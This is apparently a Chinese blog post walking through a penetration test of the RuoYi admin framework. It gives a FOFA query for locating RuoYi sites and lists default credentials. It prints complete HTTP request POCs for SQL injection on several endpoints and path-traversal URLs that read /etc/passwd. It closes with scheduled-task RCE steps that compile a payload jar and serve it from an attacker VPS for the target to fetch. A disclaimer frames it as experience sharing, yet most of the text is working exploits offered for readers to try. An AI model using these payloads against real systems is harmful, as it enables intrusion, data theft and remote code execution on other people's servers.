# 原创
：  渗透测试--实战若依ruoyi框架

# 渗透测试--实战若依ruoyi框架

### 免责声明：

**文章中涉及的漏洞均已修复，敏感信息均已做打码处理，文章仅做经验分享用途，切勿当真，未授权的攻击属于非法行为！文章中敏感信息均已做多层打马处理。传播、利用本文章所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任，一旦造成后果请自行负责**

### 一：前言

最近在挖某src的时候，碰到了一套若依，本以为啥都没有，结果随手一测若依存在的历史漏洞基本都有。是通过很奇怪的信息收集方式找到这个站的，分享出来让大家看看。<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/85f1103e2a5e94cc98684ac3e010e369.jpeg"/><br/> 老司机一看就明白了我在找什么，虽然说机会不大，但偏偏就让我遇到了。

### 二：ruoyi（若依）框架

若依（Ruoyi）框架是一款基于 Spring Boot 2.5.5、Spring Cloud 2020.0、OAuth2 与 JWT 鉴权等核心技术，同时也支持Spring Security、Apache Shiro 等多种安全框架，以及 Mybatis、JPA 等流行持久化框架，提供了许多常用的功能模块，包括系统管理、监控管理、任务调度、代码生成、文件上传、高德地图等功能的快速开发平台。<br/> 若依框架采用前后端分离的模式，基于Vue.js实现了前端UI框架，采用Feign作为服务调用，通过 Nacos 实现统一配置管理，是一款高效率、低封装、面向前端的开发框架。<br/> fofa语句：`app="若依-管理系统"`

### 三：ruoyi（若依）漏洞

#### 前端存储账号密码

<img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/d8cf46bdcac3725841e435cb0fc7f278.jpeg"/><br/> 这个站进来是这样的，没错就是账号密码存储在前端，本来想试试弱口令的，这账号密码都摆着了，（狗头）<br/> 不过大家遇见若依一般是不会有这种情况的，下面是若依系统常见的弱口令：<br/> admin/admin123<br/> ry/admin123<br/> ruoyi/admin123<br/> 识别若依框架也很简单，大概就长这样，如果验证码是简单计算，存在记住密码也可能是若依<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/72b00b4ca8202d28167f92232b5f29b0.jpeg"/>

#### SQL注入1

/system/role/list端点存在注入<br/> POC：

```
POST /system/role/list HTTP/1.1
Host: ip:port
Content-Length: 179
sec-ch-ua: "Chromium";v="109", "Not_A Brand";v="99"
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36
sec-ch-ua-platform: "Windows"
Origin: http://127.0.0.1
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1/system/role
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: yourcookie
Connection: close

pageSize=&amp;pageNum=&amp;orderByColumn=&amp;isAsc=&amp;roleName=&amp;roleKey=&amp;status=&amp;params[beginTime]=&amp;params[endTime]=&amp;params[dataScope]=and extractvalue(1,concat(0x7e,(select database()),0x7e))

```

#### SQL注入2

/system/dept/edit此接口存在SQL注入

```
POST /system/dept/edit HTTP/1.1
Host: ip:port
Content-Length: 111
sec-ch-ua: "Chromium";v="109", "Not_A Brand";v="99"
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36
sec-ch-ua-platform: "Windows"
Origin: http://127.0.0.1
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1/system/role
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: yourcookie
Connection: close

DeptName=1&amp;DeptId=100&amp;ParentId=12&amp;Status=0&amp;OrderNum=1&amp;ancestors=0)or(extractvalue(1,concat((select user()))));#

```

#### SQL注入3

/system/role/export端点存在注入<br/> poc：

```
POST /system/role/export HTTP/1.1
Host: ip:port
Content-Length: 75
sec-ch-ua: "Chromium";v="109", "Not_A Brand";v="99"
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36
sec-ch-ua-platform: "Windows"
Origin: http://127.0.0.1
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1/system/role
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: yourcookie
Connection: close

params[dataScope]=and extractvalue(1,concat(0x7e,(select database()),0x7e))

```

#### SQL注入4

/tool/gen/createTable端点<br/> 如果页面如下则可能存在漏洞<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/ad01e1c36f0f916b1f64f228b689a1b0.jpeg"/><br/> 这里没有漏洞，我把poc放上来大家可以试试

```
POST

sql=CREATE table ss1 as SELECT/**/* FROM sys_job WHERE 1=1 union/**/SELECT/**/extractvalue(1,concat(0x7e,(select/**/version()),0x7e));

```

#### 后台任意文件读取

```
/common/download/resource?resource=/profile/../../../../Windows/win.ini

```

```
/common/download/resource?resource=/profile/../../../../etc/passwd

```

#### shiro反序列化

若依系统是使用了shiro的，所以可以直接当shiro来打。<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/4ad92e7512b925d65318fd07e15e0435.jpeg"/><br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/9eadd9ebbc926d6bf9d1c777a77e69bd.jpeg"/><br/> 直接一把梭哈<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/7761fef6a760c1e6e8ef5c1f412363c8.jpeg"/>

#### 后台定时任务RCE

由于若依后台计划任务处，对于传入的“调用目标字符串”没有任何校验，导致攻击者可以调用任意类、方法及参数触发反射执行命令。影响版本：RuoYi&lt;4.6.2<br/> 1.下载exp<br/> https://github.com/artsploit/yaml-payload<br/> 2.修改 AwesomeScriptEngineFactory.java文件，exec里改成要执行的命令<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/48527210c9d61a2b2d78eced8b2e22e0.jpeg"/><br/> 3.编译<br/> javac src/artsploit/AwesomeScriptEngineFactory.java

jar -cvf yaml-payload.jar -C src/ .<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/7bb9f7b4d4991d3f4bb8ee38bb5ac326.jpeg"/><br/> 就会生成一个.jar文件，放在vps上，开启一个http服务<br/> python3 -m http.server 5555<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/a1955bf7f46211b3790a533a01c31004.jpeg"/><br/> 然后回到若依后台，添加一个计划任务，这里直接用工具了<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/4cbe234b30a18212ba661fbdd0b40ced.jpeg"/><br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/06c8db5cbc29ad395566c599701b9b91.jpeg"/>
